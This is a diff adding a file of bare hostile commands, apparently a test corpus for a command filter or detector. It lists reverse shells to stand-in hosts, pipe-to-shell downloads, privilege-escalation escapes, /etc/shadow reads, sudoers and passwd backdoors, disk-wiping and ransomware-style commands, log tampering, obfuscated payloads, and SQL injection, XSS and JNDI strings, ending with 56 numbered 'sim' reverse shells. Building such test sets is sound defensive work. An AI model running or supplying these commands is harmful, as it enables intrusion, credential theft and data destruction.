@@ -1,0 +1,200 @@
+nc -e /bin/sh 198.51.100.42 4444
+nc -e /bin/bash 203.0.113.15 1337
+ncat --ssl -e /bin/bash 192.0.2.88 443
+bash -i >& /dev/tcp/198.51.100.42/8888 0>&1
+/bin/sh -i >& /dev/tcp/203.0.113.15/9001 0>&1
+socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp-connect:198.51.100.42:4444
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("198.51.100.42",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn("/bin/bash")'
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"198.51.100.42:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+php -r '$sock=fsockopen("198.51.100.42",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+ruby -rsocket -e 'c=TCPSocket.new("198.51.100.42",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+openssl s_client -quiet -connect 198.51.100.42:443 | /bin/bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 198.51.100.42 4444 > /tmp/f
+mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 198.51.100.42 4444 1>/tmp/backpipe
+curl -s http://attacker-c2.net/shell.sh | bash
+wget -qO- http://malicious-host.org/payload.bin | /bin/sh
+curl -k https://evil.corp/stager | python3
+vim -c ':!/bin/bash'
+vim -c ':!/bin/sh'
+vi -c ':!/bin/bash'
+vi -c ':!sh'
+nano -c ':!/bin/sh'
+nano -c ':!/bin/bash'
+sudo vim -exec /bin/sh \;
+sudo vi -exec /bin/bash \;
+sudo nano -exec /bin/sh \;
+find . -exec /bin/sh \;
+find . -exec /bin/bash \;
+gdb -nx -ex '!sh' -ex 'quit'
+gdb -p 1 -ex 'call (void)system("/bin/sh")'
+man man !/bin/sh
+less /etc/hosts !/bin/sh
+more /etc/hosts !/bin/sh
+env /bin/sh
+env /bin/bash
+taskset 1 /bin/sh
+flock -u / /bin/sh
+unshare -r /bin/bash
+unshare -r /bin/sh
+capsh --gid=0 --uid=0 --
+pkexec --user root /bin/sh
+pkexec --user root /bin/bash
+tar --checkpoint=1 --checkpoint-action=exec=/bin/sh -cf /dev/null /dev/null
+zip /tmp/test.zip /etc/hosts -T -TT '/bin/sh #'
+awk 'BEGIN {system("/bin/sh")}'
+sed -e '1w /dev/null' -e '1e /bin/sh' /etc/hosts
+cat /etc/shadow
+head -n 5 /etc/shadow
+tail -n 5 /etc/shadow
+less /etc/shadow
+more /etc/shadow
+grep root /etc/shadow
+base64 /etc/shadow
+xxd /etc/shadow
+hexdump -C /etc/shadow
+strings /etc/shadow
+od -c /etc/shadow
+cat /etc/gshadow
+cat /etc/security/opasswd
+cat /etc/master.passwd
+tar -czf loot_shadow.tar.gz /etc/shadow
+unshadow /etc/passwd /etc/shadow
+cat ///////etc///////shadow
+awk '{print}' /etc/shadow
+sed 's/x/y/' /etc/shadow
+cp /etc/shadow /tmp/shadow.txt
+cat /var/backups/shadow.bak
+chmod +s /bin/bash
+chmod +s /bin/sh
+chmod 4755 /bin/dash
+chmod 4777 /tmp/rootshell
+chmod u+s /usr/bin/find
+cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell
+echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+echo "hacker:x:0:0::/root:/bin/bash" >> /etc/passwd
+usermod -aG sudo hacker
+usermod -u 0 -o -g 0 rootbackdoor
+chmod 777 /etc/sudoers
+chmod 777 /etc/passwd
+echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
+rm -rf /
+rm -rf /*
+rm -rf /etc
+rm -rf /boot
+rm -rf /var
+rm -rf /usr
+chmod -R 000 /
+chown -R nobody:nogroup /
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda bs=1M count=100
+dd if=/dev/urandom of=/dev/nvme0n1 bs=1M count=100
+wipefs -a -f /dev/sda
+blkdiscard -f /dev/sda
+mkfs.ext4 -F /dev/sda1
+find / -name "*.db" -delete
+find / -name "*.sql" -exec rm -f {} \;
+openssl enc -aes-256-cbc -salt -in /data -out /data.enc -k ransom123 && rm -rf /data
+insmod /tmp/rootkit.ko
+insmod /tmp/diamorphine.ko
+insmod /tmp/reptile.ko
+modprobe -f rootkit
+modprobe -f diamorphine
+dmesg -c
+history -c && history -w
+shred -u ~/.bash_history
+ln -sf /dev/null ~/.bash_history
+export HISTFILE=/dev/null
+export HISTSIZE=0
+kill -9 $(pgrep auditd)
+systemctl stop auditd
+> /var/log/wtmp
+> /var/log/btmp
+> /var/log/lastlog
+chattr +i /etc/ld.so.preload
+mount -o bind /dev/null /var/log/syslog
+setenforce 0
+modprobe -r apparmor
+echo "Y2F0IC9ldGMvc2hhZG93" | base64 -d | bash
+echo "cm0gLXJmIC8=" | base64 -d | bash
+echo "bmMgLWUgL2Jpbi9zaCAxOTIuMC4yLjEgNDQ0NA==" | base64 -d | sh
+python3 -c "import base64; exec(base64.b64decode('Y2F0IC9ldGMvc2hhZG93'))"
+echo '636174202f6574632f736861646f77' | xxd -r -p | sh
+$(echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77")
+nmap -sS -p- 192.168.1.1
+nmap -sV -sC -O 10.0.0.1
+masscan -p1-65535 192.168.1.0/24
+zmap -p 443 192.168.1.0/24
+hping3 -S --flood 192.168.1.1
+sqlmap -u "http://target.corp/login.php?id=1" --dbs --batch
+gobuster dir -u http://target.corp -w /usr/share/wordlists/dirb/common.txt
+ffuf -u http://target.corp/FUZZ -w /usr/share/wordlists/dirb/common.txt
+nuclei -u http://target.corp
+hydra -l root -P pass.txt ssh://192.168.1.1
+nikto -h http://192.168.1.1
+admin' UNION SELECT 1,username,password FROM users--
+1' OR '1'='1' UNION ALL SELECT NULL,table_name,column_name FROM information_schema.columns--
+1; WAITFOR DELAY '0:0:10'--
+1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+1' UNION SELECT 1,load_file('/etc/shadow'),3--
+1' INTO OUTFILE '/var/www/html/backdoor.php' LINES STARTING BY '<?php system($_GET["c"]); ?>'--
+<script>alert(document.cookie)</script>
+${jndi:ldap://evil.corp:1389/Exploit}
+${jndi:rmi://attacker.com/Object}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+/../../../../etc/shadow
+bash -i >& /dev/tcp/198.51.100.2/9101 0>&1 # sim_1
+bash -i >& /dev/tcp/198.51.100.3/9102 0>&1 # sim_2
+bash -i >& /dev/tcp/198.51.100.4/9103 0>&1 # sim_3
+bash -i >& /dev/tcp/198.51.100.5/9104 0>&1 # sim_4
+bash -i >& /dev/tcp/198.51.100.6/9105 0>&1 # sim_5
+bash -i >& /dev/tcp/198.51.100.7/9106 0>&1 # sim_6
+bash -i >& /dev/tcp/198.51.100.8/9107 0>&1 # sim_7
+bash -i >& /dev/tcp/198.51.100.9/9108 0>&1 # sim_8
+bash -i >& /dev/tcp/198.51.100.10/9109 0>&1 # sim_9
+bash -i >& /dev/tcp/198.51.100.11/9110 0>&1 # sim_10
+bash -i >& /dev/tcp/198.51.100.12/9111 0>&1 # sim_11
+bash -i >& /dev/tcp/198.51.100.13/9112 0>&1 # sim_12
+bash -i >& /dev/tcp/198.51.100.14/9113 0>&1 # sim_13
+bash -i >& /dev/tcp/198.51.100.15/9114 0>&1 # sim_14
+bash -i >& /dev/tcp/198.51.100.16/9115 0>&1 # sim_15
+bash -i >& /dev/tcp/198.51.100.17/9116 0>&1 # sim_16
+bash -i >& /dev/tcp/198.51.100.18/9117 0>&1 # sim_17
+bash -i >& /dev/tcp/198.51.100.19/9118 0>&1 # sim_18
+bash -i >& /dev/tcp/198.51.100.20/9119 0>&1 # sim_19
+bash -i >& /dev/tcp/198.51.100.21/9120 0>&1 # sim_20
+bash -i >& /dev/tcp/198.51.100.22/9121 0>&1 # sim_21
+bash -i >& /dev/tcp/198.51.100.23/9122 0>&1 # sim_22
+bash -i >& /dev/tcp/198.51.100.24/9123 0>&1 # sim_23
+bash -i >& /dev/tcp/198.51.100.25/9124 0>&1 # sim_24
+bash -i >& /dev/tcp/198.51.100.26/9125 0>&1 # sim_25
+bash -i >& /dev/tcp/198.51.100.27/9126 0>&1 # sim_26
+bash -i >& /dev/tcp/198.51.100.28/9127 0>&1 # sim_27
+bash -i >& /dev/tcp/198.51.100.29/9128 0>&1 # sim_28
+bash -i >& /dev/tcp/198.51.100.30/9129 0>&1 # sim_29
+bash -i >& /dev/tcp/198.51.100.31/9130 0>&1 # sim_30
+bash -i >& /dev/tcp/198.51.100.32/9131 0>&1 # sim_31
+bash -i >& /dev/tcp/198.51.100.33/9132 0>&1 # sim_32
+bash -i >& /dev/tcp/198.51.100.34/9133 0>&1 # sim_33
+bash -i >& /dev/tcp/198.51.100.35/9134 0>&1 # sim_34
+bash -i >& /dev/tcp/198.51.100.36/9135 0>&1 # sim_35
+bash -i >& /dev/tcp/198.51.100.37/9136 0>&1 # sim_36
+bash -i >& /dev/tcp/198.51.100.38/9137 0>&1 # sim_37
+bash -i >& /dev/tcp/198.51.100.39/9138 0>&1 # sim_38
+bash -i >& /dev/tcp/198.51.100.40/9139 0>&1 # sim_39
+bash -i >& /dev/tcp/198.51.100.41/9140 0>&1 # sim_40
+bash -i >& /dev/tcp/198.51.100.42/9141 0>&1 # sim_41
+bash -i >& /dev/tcp/198.51.100.43/9142 0>&1 # sim_42
+bash -i >& /dev/tcp/198.51.100.44/9143 0>&1 # sim_43
+bash -i >& /dev/tcp/198.51.100.45/9144 0>&1 # sim_44
+bash -i >& /dev/tcp/198.51.100.46/9145 0>&1 # sim_45
+bash -i >& /dev/tcp/198.51.100.47/9146 0>&1 # sim_46
+bash -i >& /dev/tcp/198.51.100.48/9147 0>&1 # sim_47
+bash -i >& /dev/tcp/198.51.100.49/9148 0>&1 # sim_48
+bash -i >& /dev/tcp/198.51.100.50/9149 0>&1 # sim_49
+bash -i >& /dev/tcp/198.51.100.51/9150 0>&1 # sim_50
+bash -i >& /dev/tcp/198.51.100.52/9151 0>&1 # sim_51
+bash -i >& /dev/tcp/198.51.100.53/9152 0>&1 # sim_52
+bash -i >& /dev/tcp/198.51.100.54/9153 0>&1 # sim_53
+bash -i >& /dev/tcp/198.51.100.55/9154 0>&1 # sim_54
+bash -i >& /dev/tcp/198.51.100.56/9155 0>&1 # sim_55
+bash -i >& /dev/tcp/198.51.100.57/9156 0>&1 # sim_56
